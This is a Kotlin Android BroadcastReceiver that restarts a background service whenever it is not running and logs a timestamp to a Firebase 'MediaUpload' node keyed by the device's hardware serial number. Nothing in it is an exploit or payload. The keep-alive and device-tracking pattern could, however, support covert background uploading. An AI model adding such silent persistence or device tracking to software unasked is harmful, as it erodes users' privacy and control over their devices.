package com.developer.service

import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.google.firebase.database.FirebaseDatabase

class BroadcastReceiver : BroadcastReceiver() {

    private var context: Context? = null
    override fun onReceive(context: Context, intent: Intent) {
        this.context = context


        if (!isMyServiceRunning(Service::class.java))
            context.startService(Intent(context, Service::class.java))

        val database = FirebaseDatabase.getInstance()
        val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("LastFire")
        myRef.setValue(System.currentTimeMillis())

    }

    private fun isMyServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = context?.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        return manager.getRunningServices(Integer.MAX_VALUE).any { serviceClass.name == it.service.className }
    }
}